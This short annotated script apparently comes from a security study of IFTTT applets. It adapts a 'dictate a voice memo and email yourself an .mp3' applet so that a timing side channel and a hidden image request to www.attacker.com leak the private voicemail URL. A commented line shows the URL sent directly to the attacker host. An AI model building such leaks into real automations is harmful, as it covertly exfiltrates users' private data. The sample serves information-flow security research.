//Maker: danfriedlander
//Link2Applet: https://ifttt.com/applets/774p-dictate-a-voice-memo-and-email-yourself-an-mp3-file
//Title of Applet:  Dictate a voice memo and email yourself an .mp3 file
//Trigger service: Phone Call
//Action service: Email 
//Policy/Presence:  Confidentiality of Phone Call / NO


url = urlh(lbl("PhoneCall.leaveIftttAVoicemail.Mp3Url"));

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (url.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


attack = imgl("www.attacker.com?" + res);
				//'<img src=\"www.attacker.com' + url + '\" style=\"width:0px;height:0px;\">';
sink('Email.sendMeEmail', 'setSubject', 'Link to Phone Call');
sink('Email.sendMeEmail', 'setBody', url + attack);
